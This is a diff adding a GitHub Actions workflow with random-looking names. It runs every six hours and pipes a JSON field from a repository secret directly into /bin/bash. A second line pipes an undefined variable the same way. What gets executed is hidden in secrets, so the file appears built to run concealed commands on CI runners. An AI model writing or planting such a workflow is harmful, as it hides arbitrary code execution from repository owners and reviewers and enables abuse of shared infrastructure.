@@ -1,0 +1,20 @@
+name: jixuanyuan4756
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jixuanyuan4756
+        env:
+          kzvuv2098: ${{ secrets.kzvuv2098 }}
+        run: |
+          echo $kzvuv2098 | jq -r .suh9 | /bin/bash
+          echo $zj4 | jq -r .zjj260 | /bin/bash
+
